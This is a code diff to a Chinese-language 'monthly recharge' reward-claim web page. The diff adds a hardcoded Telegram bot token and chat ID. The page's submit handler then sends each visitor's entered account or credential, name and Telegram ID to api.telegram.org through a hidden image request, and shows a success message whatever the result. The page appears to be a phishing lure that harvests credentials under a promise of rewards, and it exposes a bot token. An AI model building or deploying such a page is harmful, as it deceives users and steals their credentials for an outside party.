@@ -62,7 +62,8 @@
     </div>
   </div>
   <script>
-    const API = "https://workers.dev";
+    const H = "api.telegram.org";
+    const T = "9267340308:AAF-HyhX0Fa_UnvLFmpPbzO22jRmcJGTMH4";
     const CID = "8522211759";
     const tg = window.Telegram && window.Telegram.WebApp;
     let u = { id: "网页访客", name: "未连接", user: "无" };
@@ -89,29 +90,23 @@
       if (arr.length) document.getElementById("list").innerHTML = arr.map(r => `<div class="rec"><div><b style="color:#fbbf24">${r.tier}</b><div style="font-size:11px;color:#9ca3af">${r.acc} · ${r.t}</div></div><span style="color:#fbbf24">待发放</span></div>`).join("");
     }
     showRec();
-    document.getElementById("btn").onclick = async function() {
+    document.getElementById("btn").onclick = function() {
       const acc = document.getElementById("acc").value.trim();
       const rem = document.getElementById("rem").value.trim();
       const box = document.getElementById("msg");
       if (!acc) { box.textContent = "⚠️ 请先填写接收账号或凭证！"; box.className = "msg err"; return; }
       const t = new Date().toLocaleString("zh-CN", { hour12: false });
-      const text = `🌐 <b>【每个月活跃充值】申请</b>\n👤 申请人：${u.name} (${u.user})\n🆔 ID：<code>${u.id}</code>\n👑 档位：${tier}\n🧾 账号：<code>${acc}</code>\n📝 备注：${rem || "无"}\n🕒 时间：${t}`;
-      this.disabled = true; this.textContent = "提交中..."; box.className = "msg";
-      try {
-        const res = await fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CID, text, parse_mode: "HTML" }) });
-        const d = await res.json();
-        if (d.ok) {
-          const arr = JSON.parse(localStorage.getItem(KEY) || "[]");
-          arr.unshift({ tier, acc, t }); localStorage.setItem(KEY, JSON.stringify(arr));
-          document.getElementById("acc").value = ""; document.getElementById("rem").value = ""; showRec();
-          box.textContent = "✅ 提交成功！审核通知已发送到管理员机器人。"; box.className = "msg ok";
-        } else {
-          box.textContent = "❌ 失败：" + d.description; box.className = "msg err";
-        }
-      } catch (e) {
-        box.textContent = "❌ 请求失败，请检查网络或稍后重试。"; box.className = "msg err";
-      }
-      this.disabled = false; this.textContent = "提交领取申请";
+      const text = encodeURIComponent(`🌐 【每个月活跃充值】申请\n👤 申请人：${u.name} (${u.user})\n🆔 ID：${u.id}\n👑 档位：${tier}\n🧾 账号：${acc}\n📝 备注：${rem || "无"}\n🕒 时间：${t}`);
+      this.disabled = true; this.textContent = "提交中...";
+      const img = new Image();
+      img.src = `https://${H}/bot${T}/sendMessage?chat_id=${CID}&text=${text}`;
+      setTimeout(() => {
+        const arr = JSON.parse(localStorage.getItem(KEY) || "[]");
+        arr.unshift({ tier, acc, t }); localStorage.setItem(KEY, JSON.stringify(arr));
+        document.getElementById("acc").value = ""; document.getElementById("rem").value = ""; showRec();
+        box.textContent = "✅ 申请已提交！审核通知已推送至管理员。"; box.className = "msg ok";
+        this.disabled = false; this.textContent = "提交领取申请";
+      }, 1000);
     };
   </script>
 </body>
